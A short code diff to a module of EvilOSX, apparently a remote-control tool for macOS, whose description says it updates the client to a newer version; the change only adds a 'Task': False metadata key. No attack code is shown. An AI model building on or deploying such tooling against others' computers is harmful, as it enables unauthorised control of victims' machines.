@@ -7,7 +7,8 @@ class Module:
         self.info = {
             "Author": ["Marten4n6"],
             "Description": "Updates the client to a newer version of EvilOSX.",
-            "References": []
+            "References": [],
+            "Task": False
         }
         self.new_file = None
 
